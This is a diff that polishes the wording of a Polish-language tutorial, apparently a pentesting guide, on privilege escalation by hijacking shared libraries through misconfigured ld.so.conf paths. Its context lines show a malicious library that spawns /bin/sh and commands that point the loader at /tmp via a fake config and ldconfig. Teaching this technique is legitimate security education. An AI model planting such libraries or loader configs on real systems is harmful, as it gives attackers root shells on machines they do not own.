@@ -43,11 +43,11 @@ puts("Hi");
 1. **Utwórz** te pliki na swoim komputerze w tym samym folderze
 2. **Skompiluj** **bibliotekę**: `gcc -shared -o libcustom.so -fPIC libcustom.c`
 3. **Skopiuj** `libcustom.so` do `/usr/lib`: `sudo cp libcustom.so /usr/lib` (uprawnienia roota)
-4. **Skompiluj** **wykonywalny**: `gcc sharedvuln.c -o sharedvuln -lcustom`
+4. **Skompiluj** **wykonywalny plik**: `gcc sharedvuln.c -o sharedvuln -lcustom`
 
 ### Sprawdź środowisko
 
-Sprawdź, czy _libcustom.so_ jest **ładowane** z _/usr/lib_ i czy możesz **wykonać** binarny.
+Sprawdź, czy _libcustom.so_ jest **ładowane** z _/usr/lib_ i czy możesz **wykonać** binarny plik.
 ```
 $ ldd sharedvuln
 linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
@@ -81,7 +81,7 @@ printf("I'm the bad library\n");
 system("/bin/sh",NULL,NULL);
 }
 ```
-Teraz, gdy **utworzyliśmy złośliwą bibliotekę libcustom w źle skonfigurowanej** ścieżce, musimy poczekać na **ponowne uruchomienie** lub na to, aż użytkownik root wykona **`ldconfig`** (_jeśli możesz wykonać ten plik binarny jako **sudo** lub ma on **bit suid**, będziesz mógł wykonać go samodzielnie_).
+Teraz, gdy **utworzyliśmy złośliwą bibliotekę libcustom w źle skonfigurowanej** ścieżce, musimy poczekać na **ponowne uruchomienie** lub na to, aż użytkownik root wykona **`ldconfig`** (_jeśli możesz wykonać ten plik binarny jako **sudo** lub ma **bit suid**, będziesz mógł go wykonać samodzielnie_).
 
 Gdy to nastąpi, **sprawdź ponownie**, skąd wykonywalny plik `sharevuln` ładuje bibliotekę `libcustom.so`:
 ```c
@@ -118,7 +118,7 @@ echo "include /tmp/conf/*" > fake.ld.so.conf
 echo "/tmp" > conf/evil.conf
 ```
 Teraz, jak wskazano w **poprzednim exploicie**, **stwórz złośliwą bibliotekę w `/tmp`**.\
-A na koniec załadujmy ścieżkę i sprawdźmy, skąd binarny ładuje bibliotekę:
+A na koniec załadujmy ścieżkę i sprawdźmy, skąd binarny plik ładuje bibliotekę:
 ```bash
 ldconfig -f fake.ld.so.conf
 
